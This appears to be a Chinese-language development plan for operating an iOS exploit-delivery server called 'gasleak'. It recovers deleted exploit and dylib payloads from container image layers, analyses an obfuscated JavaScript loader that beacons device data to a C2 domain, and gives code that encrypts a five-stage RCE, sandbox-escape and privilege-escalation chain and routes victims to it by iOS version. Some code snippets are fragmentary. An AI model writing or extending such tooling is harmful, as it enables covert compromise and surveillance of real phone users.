## 0. 阻塞项已解除：templates/ 已提取

上一版方案的最大阻塞（`templates/` 不在分析产物中）**已解决**。

### 0.1 关键发现：templates 被最后一个镜像层删除

`gasleak-system/images.tar`（OCI 格式，450,988,032 字节，65 个条目）中
`gasleak-server:v0.0.101` 共 12 个层，`app/templates` 的出现情况：

| 层 | 层摘要 | 条目数 | templates 情况 |
|---|---|---|---|
| 10 | `7b3c6ad7a170...` | 108 | **含完整 `app/templates/`（107 项）** |
| 11 | `f5cb3bebc9ad...` | 719 | `app/templates/.wh.exploit`、`.wh.landing`、`payloads/.wh.tglib.dylib`、`raw/.wh.corepayload.dylib`、`raw/.wh.loader.dylib` |

`.wh.` 是 OverlayFS **whiteout 标记**，语义是「删除下层同名条目」。
即：**出厂镜像的最后一层主动删除了 exploit 模板、raw 二进制与 tglib**，
只保留 `templates/payloads/*.dylib` 中部分文件。

这解释了为什么运行中的容器里 `templates/exploit` 与 `templates/raw` 不存在，
也意味着**直接在线上容器执行 `docker cp` 拿不到这些文件**——
必须从**镜像层 10**（最后一层删除之前的状态）提取。

### 1.1 两个占位符的确切语义 [已核实]

入口 `10a3bac758f90cac620daa496b0add8.js`（50,670 字节）中：

```js
async function V(){
  try{
    const V="1DECX7UIQIB5R";        // ← 出厂渠道号，被替换为 channel.code
    const dom = window.location.hostname;
    ...
```

**占位符 2 — 上报域名**（`replace(/ipsadminuser\.shop/g, primaryDomain)`，**仅出现 1 次**）：

```js
const N="https://ipsadminuser.shop/api",
U=await fetch(N+"/ip-sync/sync",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({channelCode:V, ip:R, deviceVersion:T, domain:dom})
```

**行为**：每 10 秒向 `https://<primaryDomain>/api/ip-sync/sync` POST
`{channelCode, ip, deviceVersion, domain}`。IP 由 `https://ipv4.icanhazip.com` 获取。

> **命名提醒**：`V` 同时用作**渠道号常量**和多个函数的**形参名**（如 `const V=parseInt(l[1],10)`）。
> `channel_creator.js` 的正则 `const\s+V\s*=\s*"[^"]*"` 带引号约束，
> 但该文件内 `const V="..."` 形态**需确认是否唯一**；替换前应断言命中次数 == 1。

### 1.2 模块装载器机制 [已核实]

入口用 base64 + `new Function` 自解压出模块表 `MM`：

```js
globalThis.obChTK = new Function(atob("<29924 字节 base64>"))
```

解出的 `MM` 结构为 `{ "<sha1>": "<base64 模块体>", ... }`，并挂载装载函数：

```js
obChTK.V3O0j = function(M, I){ M in e == !1 && (e[M] = new Function(atob(I))()) }
```

**已解出 2 个模块**：

| 模块 SHA1 | 明文长度 | 作用 |
|---|---|---|
| `57620206d62079baad0e57e6d9ec93120c0f5247` | 8,309 | 基础运行时：定义 `r.U`(BigInt)、`r.S`/`r.T`/`r.P`(Float64↔Uint32 转换)、`r.N`(hex 化，`null` 时经 XOR 77 还原为 `"null"`)、`r.D`(收集) |
| `14669ca3b1519ba2a8f40be287f646d4d7593eb0` | 12,475 | 通过 `obChTK.hPL3On("<sha1>")` 装载依赖 |

**交叉验证**：模块 2 的第 2 个 XOR 串（key=67）解码结果正是
`"57620206d62079baad0e57e6d9ec93120c0f5247"` —— 与模块 1 的键**完全一致**，
证明这是一条**自举式模块图**（loader → 基础运行时 → 后续模块）。

> **[待确认]** 模块 2 中的第 2 个 XOR 串解密为 `02375753a3752<gd` —— 含 `<` 与 `g`，
> 疑似**还有一层偏移/二次编码**，或用于拼接 hex 前缀。需在执行环境中断点确认。


`patchLoader` 把域名数从 **512 改为 32**（`0x82C24`），与此对齐。

### 阶段 1：链引擎改造（把两条链变成 gasleak 的模块）

#### 1.1 darksword → chain A

五模块接力顺序**不可调换**（`CHAIN-FLOW.md` [已核实]）：

```
rce_loader.js → rce_worker.js → sbx0_main_18.4.js → sbx1_main.js → pe_main.js
```

**关键约束**：darksword 的 `server.py` 以 `Path(__file__).parent` 为服务根并创建软链
`rce_worker_18.4.js → rce_worker.js`，**不能把客户端 JS 移出该目录** [已核实于 README]。
因此改造策略是**加适配层而非搬文件**。

```js
// gasleak-server/services/chain-darksword.js
import path from 'node:path';
import crypto from 'node:crypto';
import { readFile, mkdir } from 'node:fs/promises';
import { PayloadCrypto } from '../core/crypto/seven-zip.js';

// 顺序敏感：见 darksword/CHAIN-FLOW.md
const DARKSWORD_MODULES = [
  { name: 'ds_rce_loader', src: 'rce_loader.js',     cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_rce_worker', src: 'rce_worker.js',     cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_sbx0',       src: 'sbx0_main_18.4.js', cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_sbx1',       src: 'sbx1_main.js',      cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_pe_main',    src: 'pe_main.js',        cold: 0, doNotCloseAfterRun: 1 },
];

export async function syncDarkswordPayloads(srcDir, storageRoot) {
  const out = [];
  for (const m of DARKSWORD_MODULES) {
    const src = await readFile(path.join(srcDir, m.src));
    const encName = `${m.name}.dat`;
    const encPath = path.join(storageRoot, 'payloads', encName);
    await mkdir(path.dirname(encPath), { recursive: true });
    await PayloadCrypto.encryptBuffer(src, encPath);
    out.push({
      name: m.name, type: 'module', active: true,
      bundleId: '', cold: m.cold, doNotCloseAfterRun: m.doNotCloseAfterRun,
      sha256: crypto.createHash('sha256').update(src).digest('hex'),
      size: src.length, encryptedPath: `payloads/${encName}`,
    });
  }
  return out;
}
```

### 阶段 2：链路由层（新增，核心工作量）

```js
// gasleak-server/plugins/c2/services/chain-router.js
export const CHAINS = {
  coruna:    { min: [15, 2], max: [17, 2, 1], partial: false },
  darksword: { min: [18, 4], max: [18, 6, 2], partial: false },
};

function cmp(a, b) {
  for (let i = 0; i < Math.max(a.length, b.length); i++) {
    const x = a[i] || 0, y = b[i] || 0;
    if (x !== y) return x < y ? -1 : 1;
  }
  return 0;
}

export function pickChain(iosVersion) {
  const v = String(iosVersion || '').split('.').map(Number);
  if (v.length < 2 || v.some(isNaN)) return null;
  for (const [key, c] of Object.entries(CHAINS)) {
    if (cmp(v, c.min) >= 0 && cmp(v, c.max) <= 0) {
      // 18.5–18.6.2 仅前段可用
      const partial = key === 'darksword' && cmp(v, [18, 5]) >= 0;
      return { chain: key, partial };
    }
  }
  return null;   // 17.3–18.3.x：显式拒绝
}
```

改 `config-builder.js` 的 `getConfigJson(channel)` 增加 `device` 入参与 `chain` 字段：

```js
export async function getConfigJson(channel, device) {
  const picked = pickChain(device?.iosVersion);

    type: 'module', active: true,
    name: { $in: CHAIN_MODULE_NAMES[picked.chain] },

    entries: modules.map(m => ({ bundleId: m.bundleId,
      url: `http://[HOST_PLACEHOLDER]/details/${m.name}.js`,
      sha256: m.sha256, size: m.size, cold: m.cold ? 1 : 0,
      flags: { do_not_close_after_run: m.doNotCloseAfterRun } })),
```
